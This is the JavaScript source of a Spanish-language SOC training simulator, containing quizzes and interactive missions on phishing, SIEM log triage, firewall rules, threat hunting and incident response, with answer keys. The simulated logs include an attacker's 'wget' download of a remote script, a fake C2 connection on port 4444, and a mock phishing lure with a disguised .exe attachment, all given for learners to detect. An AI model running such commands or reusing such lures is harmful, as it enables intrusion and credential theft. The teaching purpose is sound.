// ================================================================
//  CyberVR SOC · Misiones / pruebas del simulador
// ================================================================
import { cableLab, armadoLab, fullLab, diagLab, sandbox } from './labs.js';

const shuffle = (a) => {
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
};

// ---------- Motor genérico de quiz ----------
// q: pregunta · o: opciones · a: índice correcto · e: explicación
export function quiz(questions, { pass = 0.7, pick = 0, title = '' } = {}) {
  return (el, ctx) => {
    let qs, i, ok;

    const start = () => {
      qs = pick ? shuffle([...questions]).slice(0, pick) : [...questions];
      i = 0;
      ok = 0;
      show();
    };

    const show = () => {
      const q = qs[i];
      const opts = shuffle(q.o.map((t, k) => ({ t, ok: k === q.a })));
      el.innerHTML = `
        ${title ? `<div class="sub-title">${title}</div>` : ''}
        <div class="q-progress">
          <span>Pregunta ${i + 1} / ${qs.length}</span>
          <div class="bar"><div style="width:${(i / qs.length) * 100}%"></div></div>
        </div>
        <h3 class="q-text">${q.q}</h3>
        <div class="options">
          ${opts.map((o, k) => `<button class="opt" data-k="${k}">${o.t}</button>`).join('')}
        </div>
        <div class="feedback"></div>`;

      const btns = [...el.querySelectorAll('.opt')];
      btns.forEach((b) =>
        b.addEventListener('click', () => {
          const chosen = opts[+b.dataset.k];
          if (chosen.ok) ok++;
          btns.forEach((x) => {
            x.disabled = true;
            if (opts[+x.dataset.k].ok) x.classList.add('right');
          });
          if (!chosen.ok) b.classList.add('wrong');
          const fb = el.querySelector('.feedback');
          fb.innerHTML = `
            <p class="${chosen.ok ? 'good' : 'bad'}">${chosen.ok ? '✔ Correcto' : '✘ Incorrecto'}</p>
            <p class="explain">${q.e}</p>
            <button class="btn primary">${i < qs.length - 1 ? 'Siguiente →' : 'Ver resultado'}</button>`;
          fb.querySelector('button').addEventListener('click', () => {
            i++;
            i < qs.length ? show() : end();
          });
        })
      );
    };

    const end = () => {
      const score = Math.round((ok / qs.length) * 100);
      if (ok / qs.length >= pass) return ctx.complete(score);
      const need = Math.ceil(pass * qs.length - 1e-9);
      el.innerHTML = `
        <div class="result">
          <h3 class="bad">Resultado: ${ok} / ${qs.length} (${score}%)</h3>
          <p class="explain">Necesitas mínimo ${need} respuestas correctas. Repasa las explicaciones e inténtalo de nuevo.</p>
          <button class="btn primary">Reintentar</button>
        </div>`;
      el.querySelector('button').addEventListener('click', start);
    };

    start();
  };
}

// ================================================================
//  M01 · Inducción
// ================================================================
const Q_INDUCCION = [
  {
    q: '¿Qué significa SOC?',
    o: ['Security Operations Center', 'System Online Control', 'Secure Office Connection', 'Service Operation Cloud'],
    a: 0,
    e: 'El SOC (Centro de Operaciones de Seguridad) es el equipo que monitorea, detecta, analiza y responde a amenazas 24/7.',
  },
  {
    q: 'La tríada CIA de la seguridad de la información protege:',
    o: [
      'Confidencialidad, Integridad y Disponibilidad',
      'Control, Inspección y Auditoría',
      'Cifrado, Identidad y Acceso',
      'Cumplimiento, Inventario y Antivirus',
    ],
    a: 0,
    e: 'Confidencialidad (solo quien debe ve la info), Integridad (no se altera sin autorización) y Disponibilidad (está accesible cuando se necesita).',
  },
  {
    q: '¿Cuál es la tarea principal de un analista Tier 1?',
    o: [
      'Monitorear y clasificar (triage) alertas, y escalar las que son reales',
      'Diseñar la arquitectura de red de la empresa',
      'Desarrollar el software de la compañía',
      'Negociar contratos con proveedores',
    ],
    a: 0,
    e: 'Tier 1 hace el triage; Tier 2 investiga a fondo los incidentes; Tier 3 hace threat hunting y análisis avanzado.',
  },
  {
    q: '¿Qué es un SIEM?',
    o: [
      'Una plataforma que centraliza y correlaciona logs y eventos de seguridad',
      'Un antivirus para equipos de escritorio',
      'Un tipo de cable de red',
      'Una VPN corporativa',
    ],
    a: 0,
    e: 'SIEM = Security Information and Event Management. Ejemplos: Splunk, Wazuh, QRadar, Microsoft Sentinel.',
  },
  {
    q: '¿Qué es un falso positivo?',
    o: [
      'Una alerta que se dispara pero no corresponde a una amenaza real',
      'Un ataque real que no generó ninguna alerta',
      'Un antivirus desactualizado',
      'Un usuario con contraseña débil',
    ],
    a: 0,
    e: 'Falso positivo = alerta sin amenaza real. Lo contrario (ataque real sin alerta) es un falso negativo, y es más peligroso.',
  },
];

// ================================================================
//  M02 · Redes
// ================================================================
const Q_REDES = [
  {
    q: '¿Qué puerto usa HTTPS por defecto?',
    o: ['443', '80', '21', '25'],
    a: 0,
    e: '443 = HTTPS, 80 = HTTP, 21 = FTP, 25 = SMTP.',
  },
  {
    q: 'Un router trabaja principalmente en la capa del modelo OSI:',
    o: ['Capa 3 · Red', 'Capa 2 · Enlace de datos', 'Capa 4 · Transporte', 'Capa 7 · Aplicación'],
    a: 0,
    e: 'El router enruta paquetes por direcciones IP (capa 3). El switch trabaja con MAC (capa 2).',
  },
  {
    q: '¿Cuál es el orden del three-way handshake de TCP?',
    o: ['SYN → SYN-ACK → ACK', 'ACK → SYN → FIN', 'SYN → ACK → FIN', 'HELLO → SYN → ACK'],
    a: 0,
    e: 'El cliente envía SYN, el servidor responde SYN-ACK y el cliente confirma con ACK. Un "SYN flood" abusa de este proceso.',
  },
  {
    q: '¿Cuántos hosts utilizables tiene la red 192.168.10.0/26?',
    o: ['62', '64', '30', '126'],
    a: 0,
    e: '/26 deja 6 bits para hosts: 2⁶ = 64 direcciones − 2 (red y broadcast) = 62 hosts.',
  },
  {
    q: '¿Qué puerto usa SSH?',
    o: ['22', '23', '3389', '445'],
    a: 0,
    e: '22 = SSH, 23 = Telnet (inseguro, sin cifrado), 3389 = RDP, 445 = SMB.',
  },
  {
    q: '¿Qué protocolo de transporte es sin conexión y lo usa DNS normalmente?',
    o: ['UDP', 'TCP', 'ARP', 'HTTP'],
    a: 0,
    e: 'UDP no establece conexión (sin handshake), por eso es rápido. DNS usa UDP/53 (y TCP/53 para respuestas grandes).',
  },
  {
    q: '¿Qué protocolo resuelve una IP a una dirección MAC dentro de una LAN?',
    o: ['ARP', 'DNS', 'DHCP', 'NAT'],
    a: 0,
    e: 'ARP traduce IP → MAC. El ataque "ARP spoofing" envenena esa tabla para hacer Man-in-the-Middle.',
  },
];

// ================================================================
//  M03 · Phishing
// ================================================================
function phishing(el, ctx) {
  const parts = [
    { id: 'from', ioc: true, why: 'Remitente falso: <b>banc0andino-alertas.com</b> usa un cero en vez de “o” (typosquatting) y no es el dominio oficial.' },
    { id: 'to', ioc: false, why: 'El destinatario es el correo corporativo real: eso por sí solo no es sospechoso.' },
    { id: 'subject', ioc: true, why: 'Urgencia y amenaza (“suspendida en 24 horas”): presión psicológica típica de ingeniería social.' },
    { id: 'greet', ioc: true, why: 'Saludo genérico (“Estimado cliente”): una entidad real conoce el nombre de su cliente.' },
    { id: 'body', ioc: true, why: 'Pide confirmar datos de acceso: ninguna entidad legítima solicita credenciales por correo.' },
    { id: 'link', ioc: true, why: 'El botón dice “Verificar mi cuenta” pero apunta a <b>http://banc0andino-verify.xyz/login</b>: otro dominio y sin HTTPS.' },
    { id: 'attach', ioc: true, why: 'Doble extensión <b>.pdf.exe</b>: es un ejecutable disfrazado de PDF.' },
    { id: 'sign', ioc: false, why: 'Una firma genérica no es un indicador fuerte por sí sola.' },
  ];
  const total = parts.filter((p) => p.ioc).length;
  const found = new Set();
  let errors = 0;

  el.innerHTML = `
    <p class="instr">Un usuario de Contabilidad reportó este correo. Haz clic en cada elemento que sea un
    <b>indicador de phishing</b>. Encuentra los ${total}. (Tip: pasa el mouse sobre el botón azul).</p>
    <div class="split">
      <div class="email">
        <div class="email-bar">📥 Bandeja de entrada · Correo corporativo</div>
        <div class="email-head">
          <div class="part" data-id="from"><b>De:</b> Banco Andino Seguridad &lt;seguridad@banc0andino-alertas.com&gt;</div>
          <div class="part" data-id="to"><b>Para:</b> contabilidad@cybercorp.co</div>
          <div class="part subject" data-id="subject">⚠ URGENTE: Su cuenta será suspendida en 24 horas</div>
        </div>
        <div class="email-body">
          <p class="part" data-id="greet">Estimado cliente:</p>
          <p class="part" data-id="body">Hemos detectado actividad inusual en su cuenta empresarial. Por su seguridad, debe confirmar sus datos de acceso (usuario y contraseña) de inmediato.</p>
          <p><span class="part fake-btn" data-id="link">Verificar mi cuenta</span></p>
          <p class="part attach" data-id="attach">📎 Comprobante_Seguridad.pdf.exe (412 KB)</p>
          <p class="part" data-id="sign">Atentamente,<br>Departamento de Seguridad</p>
        </div>
        <div class="status-bar" id="status-bar">Pasa el mouse sobre los enlaces para ver a dónde apuntan</div>
      </div>
      <div class="side">
        <div class="counter">Indicadores: <b id="ioc-count">0</b> / ${total}</div>
        <div class="counter">Errores: <b id="ioc-err">0</b></div>
        <ul class="found-list" id="found-list"></ul>
      </div>
    </div>
    <div id="phish-next"></div>`;

  const sb = el.querySelector('#status-bar');
  const link = el.querySelector('[data-id="link"]');
  link.addEventListener('mouseenter', () => (sb.textContent = 'http://banc0andino-verify.xyz/login'));
  link.addEventListener('mouseleave', () => (sb.textContent = 'Pasa el mouse sobre los enlaces para ver a dónde apuntan'));

  el.querySelectorAll('.part').forEach((node) =>
    node.addEventListener('click', () => {
      const p = parts.find((x) => x.id === node.dataset.id);
      if (found.has(p.id) || node.classList.contains('nope')) return;
      const li = document.createElement('li');
      if (p.ioc) {
        found.add(p.id);
        node.classList.add('flagged');
        li.className = 'good';
        li.innerHTML = '🚩 ' + p.why;
      } else {
        errors++;
        node.classList.add('nope');
        li.className = 'bad';
        li.innerHTML = '✘ ' + p.why;
      }
      el.querySelector('#found-list').prepend(li);
      el.querySelector('#ioc-count').textContent = found.size;
      el.querySelector('#ioc-err').textContent = errors;
      if (found.size === total) finish();
    })
  );

  function finish() {
    const nx = el.querySelector('#phish-next');
    quiz(
      [
        {
          q: 'Encontraste todos los indicadores. ¿Qué debe hacer el analista?',
          o: [
            'Clasificarlo como phishing, bloquear dominio/remitente en el gateway de correo, buscar si otros usuarios lo recibieron y purgarlo de los buzones',
            'Responder al remitente pidiéndole que se identifique',
            'Abrir el adjunto en tu propio equipo para confirmar si es malicioso',
            'Ignorarlo, porque el usuario no hizo clic',
          ],
          a: 0,
          e: 'Nunca se interactúa con el atacante ni se abre el adjunto fuera de un sandbox. Se contiene la campaña completa, no solo un buzón.',
        },
      ],
      { pass: 1, title: 'Decisión del analista' }
    )(nx, ctx);
    nx.scrollIntoView({ behavior: 'smooth' });
  }
}

// ================================================================
//  M04 · SIEM / análisis de logs
// ================================================================
function siem(el, ctx) {
  const A = '185.220.101.47';
  const rows = [
    ['02:10:44', '10.0.3.12', 'jgomez', 'Login SSH', 'srv-web01', 'ÉXITO'],
    ['02:12:03', A, 'root', 'Login SSH', 'srv-db01', 'FALLO'],
    ['02:12:05', A, 'root', 'Login SSH', 'srv-db01', 'FALLO'],
    ['02:12:06', A, 'admin', 'Login SSH', 'srv-db01', 'FALLO'],
    ['02:12:08', A, 'root', 'Login SSH', 'srv-db01', 'FALLO'],
    ['02:12:09', '10.0.3.40', 'mrios', 'Login VPN', 'vpn-gw01', 'ÉXITO'],
    ['02:12:10', A, 'oracle', 'Login SSH', 'srv-db01', 'FALLO'],
    ['02:12:12', A, 'root', 'Login SSH', 'srv-db01', 'FALLO'],
    ['02:12:13', A, 'test', 'Login SSH', 'srv-db01', 'FALLO'],
    ['02:12:15', A, 'root', 'Login SSH', 'srv-db01', 'FALLO'],
    ['02:12:17', A, 'root', 'Login SSH', 'srv-db01', 'ÉXITO'],
    ['02:13:40', '10.0.3.12', 'jgomez', 'Logout', 'srv-web01', 'OK'],
    ['02:14:02', A, 'root', 'CMD: wget http://45.133.1.20/x.sh', 'srv-db01', 'EJECUTADO'],
    ['02:15:11', '10.0.4.8', 'backup', 'Tarea programada', 'srv-bkp01', 'ÉXITO'],
  ];
  const cls = (c) => (c === 'FALLO' ? 'r-fail' : c === 'ÉXITO' || c === 'OK' ? 'r-ok' : c === 'EJECUTADO' ? 'r-fail' : '');

  el.innerHTML = `
    <p class="instr">Son las 02:20 a.m. El SIEM disparó la regla <code>AUTH-07: múltiples fallos de autenticación</code>.
    Revisa los eventos de los últimos 15 minutos.</p>
    <div class="siem">
      <div class="siem-head"><span>🔎 index=auth host=srv-* earliest=-15m</span><span class="sev">ALERTA ALTA</span></div>
      <table class="logs">
        <thead><tr><th>Hora</th><th>IP origen</th><th>Usuario</th><th>Evento</th><th>Host</th><th>Resultado</th></tr></thead>
        <tbody>
          ${rows.map((r, i) => `<tr data-i="${i}">${r.map((c, k) => `<td class="${k === 5 ? cls(c) : ''}">${c}</td>`).join('')}</tr>`).join('')}
        </tbody>
      </table>
    </div>
    <div id="siem-step">
      <h3>Paso 1: haz clic en una línea que pertenezca al <b>IP atacante</b>.</h3>
      <p class="explain" id="siem-msg"></p>
    </div>`;

  let solved = false;
  el.querySelectorAll('tbody tr').forEach((tr) =>
    tr.addEventListener('click', () => {
      if (solved) return;
      const r = rows[+tr.dataset.i];
      if (r[1] === A) {
        solved = true;
        el.querySelectorAll('tbody tr').forEach((t) => {
          if (rows[+t.dataset.i][1] === A) t.classList.add('hl');
        });
        const st = el.querySelector('#siem-step');
        st.innerHTML = `<p class="good">✔ Correcto: ${A} generó 8 intentos fallidos en ~12 segundos contra varias cuentas, luego un login exitoso como root y descargó un script.</p><div id="siem-q"></div>`;
        quiz(Q_SIEM, { pass: 0.66, title: 'Análisis del incidente' })(st.querySelector('#siem-q'), ctx);
      } else {
        el.querySelector('#siem-msg').innerHTML = `✘ ${r[1]} (${r[2]}) es actividad normal. Busca el patrón: muchos fallos seguidos desde el mismo origen.`;
        tr.classList.add('shake');
        setTimeout(() => tr.classList.remove('shake'), 400);
      }
    })
  );
}

const Q_SIEM = [
  {
    q: '¿Qué tipo de ataque muestran los logs?',
    o: ['Fuerza bruta (brute force) contra SSH', 'DDoS volumétrico', 'Inyección SQL', 'Phishing'],
    a: 0,
    e: 'Muchos intentos de login fallidos, rápidos y desde un mismo IP probando usuarios comunes (root, admin, oracle, test) = fuerza bruta / diccionario.',
  },
  {
    q: '¿Qué severidad le asignas al incidente?',
    o: [
      'Crítica: hubo login exitoso como root y ejecución de comandos',
      'Baja: la mayoría de intentos fallaron',
      'Informativa: es ruido normal de Internet',
      'Media: solo afecta a un servidor',
    ],
    a: 0,
    e: 'El login exitoso después de los fallos significa que la cuenta root fue comprometida, y el wget indica que el atacante ya está descargando herramientas.',
  },
  {
    q: '¿Cuál es la acción correcta del Tier 1?',
    o: [
      'Abrir el incidente, escalar a Tier 2, solicitar bloqueo del IP y aislamiento de srv-db01',
      'Cerrar la alerta como falso positivo',
      'Esperar a ver si vuelve a pasar mañana',
      'Reiniciar el servidor sin avisar a nadie',
    ],
    a: 0,
    e: 'Se documenta, se escala y se contiene. Reiniciar sin avisar puede destruir evidencia en memoria.',
  },
];

// ================================================================
//  M05 · Firewall
// ================================================================
function firewall(el, ctx) {
  el.innerHTML = `
    <p class="instr">Tu Tier 2 confirmó el incidente del SIEM. Crea una regla en el firewall perimetral para
    <b>bloquear el tráfico SSH entrante</b> que viene desde el IP atacante <code>185.220.101.47</code>.</p>
    <div class="fw">
      <div class="fw-head">🛡 FW-EDGE-01 · Nueva regla de acceso</div>
      <div class="fw-grid">
        <label>Acción
          <select id="fw-act"><option value="">—</option><option>ALLOW</option><option>DENY</option></select>
        </label>
        <label>Dirección
          <select id="fw-dir"><option value="">—</option><option>INBOUND</option><option>OUTBOUND</option></select>
        </label>
        <label>Protocolo
          <select id="fw-proto"><option value="">—</option><option>TCP</option><option>UDP</option><option>ICMP</option><option>ANY</option></select>
        </label>
        <label>IP origen <input id="fw-src" placeholder="x.x.x.x" autocomplete="off"></label>
        <label>Puerto destino <input id="fw-port" placeholder="ej: 80" autocomplete="off"></label>
      </div>
      <div class="cli"><span class="muted"># Equivalente en Linux (iptables)</span><br><code id="fw-preview"></code></div>
      <button class="btn primary" id="fw-apply">Aplicar regla</button>
      <ul class="hints" id="fw-hints"></ul>
    </div>
    <details class="tip"><summary>💡 Pista</summary>SSH funciona sobre TCP. El tráfico viene <i>desde Internet hacia</i> tu red.</details>
    <div id="fw-next"></div>`;

  const v = (id) => el.querySelector('#fw-' + id).value.trim();
  const preview = () => {
    const act = v('act'), dir = v('dir'), proto = v('proto'), src = v('src'), port = v('port');
    const p = proto ? (proto === 'ANY' ? 'all' : proto.toLowerCase()) : '?';
    const chain = dir === 'OUTBOUND' ? 'OUTPUT' : dir === 'INBOUND' ? 'INPUT' : '?';
    const jump = act === 'ALLOW' ? 'ACCEPT' : act === 'DENY' ? 'DROP' : '?';
    el.querySelector('#fw-preview').textContent = `iptables -A ${chain} -p ${p} -s ${src || '?'} --dport ${port || '?'} -j ${jump}`;
  };
  el.querySelectorAll('select, input').forEach((n) => n.addEventListener('input', preview));
  preview();

  let tries = 0;
  el.querySelector('#fw-apply').addEventListener('click', () => {
    tries++;
    const errs = [];
    if (v('act') !== 'DENY') errs.push('La acción debe bloquear el tráfico (DENY → DROP).');
    if (v('dir') !== 'INBOUND') errs.push('El ataque viene desde Internet hacia tu servidor: es tráfico entrante.');
    if (v('proto') !== 'TCP') errs.push(v('proto') === 'ANY' ? 'ANY bloquea más de lo necesario: SSH funciona sobre TCP.' : 'SSH funciona sobre TCP.');
    if (v('src') !== '185.220.101.47') errs.push('Revisa el IP origen: debe ser exactamente el del atacante.');
    if (v('port') !== '22') errs.push('¿En qué puerto escucha SSH?');

    const hints = el.querySelector('#fw-hints');
    if (errs.length) {
      hints.innerHTML = `<li class="bad">Intento ${tries}: la regla tiene ${errs.length} error(es)</li>` + errs.map((e) => `<li>${e}</li>`).join('');
      return;
    }
    hints.innerHTML = '<li class="good">✔ Regla aplicada en FW-EDGE-01. El tráfico del atacante está siendo descartado.</li>';
    el.querySelector('#fw-apply').disabled = true;
    el.querySelectorAll('select, input').forEach((n) => (n.disabled = true));
    const nx = el.querySelector('#fw-next');
    quiz(
      [
        {
          q: '¿Por qué no bloqueaste el puerto 22 para TODAS las IP?',
          o: [
            'Porque los administradores legítimos usan SSH: se bloquea solo lo malicioso para no afectar la operación',
            'Porque el firewall no permite bloquear puertos completos',
            'Porque SSH no es un servicio importante',
            'Porque así el atacante no se da cuenta',
          ],
          a: 0,
          e: 'Las reglas deben ser específicas. La mejor práctica es además permitir SSH solo desde IPs/VPN autorizadas (lista blanca) y usar llaves en vez de contraseñas.',
        },
      ],
      { pass: 1, title: 'Pregunta de control' }
    )(nx, ctx);
    nx.scrollIntoView({ behavior: 'smooth' });
  });
}

// ================================================================
//  M06 · Threat hunting en endpoint (terminal)
// ================================================================
function hunting(el, ctx) {
  const obj = { net: false, task: false, kill: false };
  el.innerHTML = `
    <p class="instr">El EDR reporta comportamiento extraño en el equipo <code>PC-FIN-023</code> de Finanzas.
    Te conectas por consola remota. Encuentra la conexión sospechosa, identifica el proceso y termínalo.
    Escribe <code>help</code> para ver los comandos.</p>
    <ul class="objectives">
      <li id="o-net">Revisar las conexiones de red activas</li>
      <li id="o-task">Identificar el proceso responsable</li>
      <li id="o-kill">Terminar el proceso malicioso</li>
    </ul>
    <div class="term">
      <div class="term-bar">Administrador: Símbolo del sistema — PC-FIN-023 (sesión remota EDR)</div>
      <div class="term-out" id="t-out">Microsoft Windows [Versión 10.0.19045]\n(c) Microsoft Corporation.\n\n</div>
      <div class="term-in"><span>C:\\Windows\\system32&gt;</span><input id="t-in" autocomplete="off" spellcheck="false"></div>
    </div>
    <div id="hunt-next"></div>`;

  const out = el.querySelector('#t-out');
  const input = el.querySelector('#t-in');
  setTimeout(() => input.focus(), 50);
  el.querySelector('.term').addEventListener('click', () => input.focus());

  const print = (txt, cls = '') => {
    const s = document.createElement('span');
    if (cls) s.className = cls;
    s.textContent = txt + '\n';
    out.appendChild(s);
    out.scrollTop = out.scrollHeight;
  };
  const check = (k) => {
    obj[k] = true;
    el.querySelector('#o-' + k).classList.add('ok');
    if (obj.net && obj.task && obj.kill) done();
  };

  const cmds = {
    help: () =>
      print(`Comandos disponibles:
  whoami          usuario actual
  hostname        nombre del equipo
  ipconfig        configuración de red
  netstat -ano    conexiones activas con PID
  tasklist        procesos en ejecución
  taskkill /PID <pid> /F   terminar un proceso
  cls             limpiar pantalla`),
    whoami: () => print('cybercorp\\soc-analyst'),
    hostname: () => print('PC-FIN-023'),
    ipconfig: () => print('Adaptador Ethernet:\n   Dirección IPv4. . . : 10.0.5.23\n   Máscara . . . . . . : 255.255.255.0\n   Puerta de enlace. . : 10.0.5.1'),
    'netstat -ano': () => {
      print(`Conexiones activas

  Proto  Dirección local      Dirección remota      Estado        PID
  TCP    0.0.0.0:135          0.0.0.0:0             LISTENING     980
  TCP    10.0.5.23:49702      52.96.165.18:443      ESTABLISHED   2210
  TCP    10.0.5.23:49711      142.250.78.14:443     ESTABLISHED   2210
  TCP    10.0.5.23:49890      13.107.42.14:443      ESTABLISHED   3020
  TCP    10.0.5.23:50133      45.133.1.20:4444      ESTABLISHED   4412
  UDP    10.0.5.23:137        *:*                                 4`);
      check('net');
    },
    tasklist: () => {
      print(`Nombre de imagen          PID   Uso de memoria
========================= ===== ==============
System                        4       1.204 KB
svchost.exe                 980      22.140 KB
explorer.exe               1880      84.512 KB
chrome.exe                 2210     312.004 KB
Teams.exe                  3020     198.330 KB
svch0st.exe                4412       9.876 KB
OneDrive.exe               5120      41.200 KB`);
      check('task');
    },
    cls: () => (out.textContent = ''),
  };

  input.addEventListener('keydown', (e) => {
    e.stopPropagation();
    if (e.key !== 'Enter') return;
    const raw = input.value;
    input.value = '';
    print('C:\\Windows\\system32>' + raw, 'cmd');
    const c = raw.trim().toLowerCase().replace(/\s+/g, ' ');
    if (!c) return;

    if (c.startsWith('taskkill')) {
      const m = c.match(/\/pid (\d+)/);
      if (!m) return print('ERROR: sintaxis inválida. Usa: taskkill /PID <pid> /F', 'err');
      const pid = m[1];
      if (!c.includes('/f')) return print(`ERROR: el proceso con PID ${pid} no pudo terminarse. Usa /F para forzarlo.`, 'err');
      const legit = { 4: 'System', 980: 'svchost.exe', 1880: 'explorer.exe', 2210: 'chrome.exe', 3020: 'Teams.exe', 5120: 'OneDrive.exe' };
      if (pid === '4412') {
        print('CORRECTO: se terminó el proceso "svch0st.exe" con PID 4412.', 'ok');
        print('[EDR] Conexión a 45.133.1.20:4444 cerrada. Binario enviado a cuarentena.', 'ok');
        if (!(obj.net && obj.task)) print('Bien, pero un buen analista primero investiga: ejecuta netstat -ano y tasklist para documentar la evidencia.', 'err');
        return check('kill');
      }
      if (legit[pid]) return print(`⚠ ${legit[pid]} (PID ${pid}) es un proceso legítimo. Terminarlo afecta al usuario sin resolver la amenaza.`, 'err');
      return print(`ERROR: no se encontró el proceso con PID ${pid}.`, 'err');
    }
    if (cmds[c]) return cmds[c]();
    if (c === 'netstat') return print('Tip: usa netstat -ano para ver también el PID de cada conexión.', 'err');
    print(`"${raw.trim()}" no se reconoce como un comando interno o externo. Escribe help.`, 'err');
  });

  let finished = false;
  function done() {
    if (finished) return;
    finished = true;
    input.disabled = true;
    const nx = el.querySelector('#hunt-next');
    quiz(
      [
        {
          q: '¿Qué hacía el proceso svch0st.exe conectado a 45.133.1.20:4444?',
          o: [
            'Era un troyano/RAT con conexión de comando y control (C2) — reverse shell',
            'Era una actualización de Windows',
            'Era el antivirus enviando reportes',
            'Era tráfico normal de Microsoft Teams',
          ],
          a: 0,
          e: 'Nombre que imita a svchost.exe (con un cero), conexión saliente a un IP externo en el puerto 4444 (por defecto de Metasploit): típico de malware con C2.',
        },
      ],
      { pass: 1, title: 'Conclusión del hunting' }
    )(nx, ctx);
    nx.scrollIntoView({ behavior: 'smooth' });
  }
}

// ================================================================
//  M07 · Respuesta a incidentes
// ================================================================
function incident(el, ctx) {
  const phases = [
    ['Preparación', 'Políticas, playbooks, herramientas y entrenamiento antes del incidente.'],
    ['Identificación / Detección', 'Detectar, confirmar el incidente y determinar su alcance.'],
    ['Contención', 'Limitar el daño: aislar equipos, bloquear cuentas o IPs.'],
    ['Erradicación', 'Eliminar la causa: malware, cuentas creadas, vulnerabilidades.'],
    ['Recuperación', 'Restaurar desde backups limpios y monitorear de cerca.'],
    ['Lecciones aprendidas', 'Informe post-incidente y mejoras para que no se repita.'],
  ];
  let next = 0;
  const order = shuffle(phases.map((_, i) => i));

  el.innerHTML = `
    <p class="instr">Hay un incidente de <b>ransomware</b> en Finanzas. Antes de actuar, el líder del SOC te pide
    ordenar las fases del ciclo de respuesta a incidentes (modelo SANS, alineado con NIST SP 800-61).
    Haz clic en las tarjetas <b>en el orden correcto</b>.</p>
    <div class="ir-board">
      <div class="ir-col"><h4>FASES DISPONIBLES</h4><div id="ir-pool"></div></div>
      <div class="ir-col"><h4>TU PLAN DE RESPUESTA</h4><div id="ir-plan"></div></div>
    </div>
    <p class="explain" id="ir-msg"></p>
    <div id="ir-next"></div>`;

  const pool = el.querySelector('#ir-pool');
  const plan = el.querySelector('#ir-plan');
  const msg = el.querySelector('#ir-msg');

  order.forEach((idx) => {
    const c = document.createElement('div');
    c.className = 'ir-card';
    c.innerHTML = `<b>${phases[idx][0]}</b><small>${phases[idx][1]}</small>`;
    c.addEventListener('click', () => {
      if (idx === next) {
        next++;
        c.classList.add('placed');
        c.querySelector('b').textContent = `${next}. ${phases[idx][0]}`;
        plan.appendChild(c);
        msg.innerHTML = '';
        if (next === phases.length) {
          msg.innerHTML = '<span class="good">✔ Plan de respuesta correcto.</span>';
          const nx = el.querySelector('#ir-next');
          quiz(Q_IR, { pass: 0.66, title: 'Ahora, el incidente real' })(nx, ctx);
          nx.scrollIntoView({ behavior: 'smooth' });
        }
      } else if (!c.classList.contains('placed')) {
        msg.innerHTML = `<span class="bad">✘ "${phases[idx][0]}" no va en la posición ${next + 1}.</span>`;
        c.classList.add('shake');
        setTimeout(() => c.classList.remove('shake'), 400);
      }
    });
    pool.appendChild(c);
  });
}

const Q_IR = [
  {
    q: 'Un equipo de Finanzas está cifrando archivos (ransomware). ¿Cuál es tu primera acción?',
    o: [
      'Aislar el equipo de la red (contención) sin apagarlo',
      'Pagar el rescate para recuperar los archivos rápido',
      'Apagar todos los servidores de la empresa',
      'Formatear el disco inmediatamente',
    ],
    a: 0,
    e: 'Aislar evita que se propague a otros equipos o carpetas compartidas. No se apaga para conservar evidencia en memoria RAM (posibles llaves, procesos).',
  },
  {
    q: 'Eliminar el malware y parchear la vulnerabilidad por la que entró corresponde a:',
    o: ['Erradicación', 'Contención', 'Preparación', 'Lecciones aprendidas'],
    a: 0,
    e: 'Erradicar = eliminar la causa raíz. Si no se cierra la puerta de entrada, el atacante vuelve.',
  },
  {
    q: '¿Para qué sirve mantener la cadena de custodia de la evidencia?',
    o: [
      'Para garantizar que la evidencia es íntegra y válida en un proceso legal',
      'Para que la evidencia ocupe menos espacio',
      'Para poder borrarla después más rápido',
      'No sirve, solo importa recuperar los sistemas',
    ],
    a: 0,
    e: 'La cadena de custodia registra quién tuvo la evidencia, cuándo y qué hizo con ella. Se usan hashes (SHA-256) para probar que no fue alterada.',
  },
];

// ================================================================
//  M08 · Examen final
// ================================================================
const Q_EXAMEN = [
  {
    q: 'Un ataque DDoS afecta principalmente a cuál pilar de la tríada CIA:',
    o: ['Disponibilidad', 'Confidencialidad', 'Integridad', 'Autenticación'],
    a: 0,
    e: 'El DDoS satura el servicio para que no esté disponible.',
  },
  {
    q: '¿Qué puerto usa RDP (Escritorio remoto de Windows)?',
    o: ['3389', '22', '8080', '139'],
    a: 0,
    e: 'RDP/3389 expuesto a Internet es uno de los vectores de entrada de ransomware más comunes.',
  },
  {
    q: '¿Qué es un IoC (Indicator of Compromise)?',
    o: [
      'Evidencia técnica de que un sistema fue comprometido (IP, hash, dominio, etc.)',
      'Un tipo de firewall',
      'Una norma ISO',
      'Un antivirus gratuito',
    ],
    a: 0,
    e: 'Ejemplos de IoC: el IP 185.220.101.47, el dominio banc0andino-verify.xyz o el hash del svch0st.exe.',
  },
  {
    q: '¿Para qué se usa un hash (por ejemplo SHA-256) en seguridad?',
    o: ['Verificar la integridad de un archivo', 'Cifrar un archivo para enviarlo', 'Comprimir archivos', 'Acelerar la red'],
    a: 0,
    e: 'El hash es una huella única: si el archivo cambia un bit, el hash cambia por completo. No es cifrado (no se puede revertir).',
  },
  {
    q: 'El principio de mínimo privilegio dice que:',
    o: [
      'Cada usuario debe tener solo los permisos necesarios para su trabajo',
      'Todos deben ser administradores para trabajar más rápido',
      'Solo el gerente puede usar el correo',
      'Las contraseñas deben ser cortas',
    ],
    a: 0,
    e: 'Si una cuenta con pocos privilegios se compromete, el daño es menor.',
  },
  {
    q: '¿Qué es MITRE ATT&CK?',
    o: [
      'Una base de conocimiento de tácticas y técnicas reales de atacantes',
      'Un antivirus',
      'Un lenguaje de programación',
      'Un protocolo de red',
    ],
    a: 0,
    e: 'El SOC lo usa para mapear detecciones. Ej: T1110 = Brute Force, T1566 = Phishing.',
  },
  {
    q: 'AES es un algoritmo de cifrado:',
    o: ['Simétrico (misma llave para cifrar y descifrar)', 'Asimétrico (llave pública y privada)', 'De hash', 'De compresión'],
    a: 0,
    e: 'AES es simétrico. RSA y ECC son asimétricos. SHA-256 es hash.',
  },
  {
    q: '¿Qué mitiga mejor un ataque de fuerza bruta?',
    o: [
      'MFA, bloqueo por intentos fallidos y contraseñas robustas',
      'Cambiar el fondo de pantalla',
      'Desactivar los logs',
      'Usar Telnet en vez de SSH',
    ],
    a: 0,
    e: 'Con MFA, aunque el atacante adivine la contraseña, le falta el segundo factor.',
  },
  {
    q: '¿Cuántos hosts utilizables tiene una red /24?',
    o: ['254', '256', '255', '128'],
    a: 0,
    e: '2⁸ = 256 − 2 (red y broadcast) = 254.',
  },
  {
    q: 'En un firewall, la política más segura por defecto es:',
    o: [
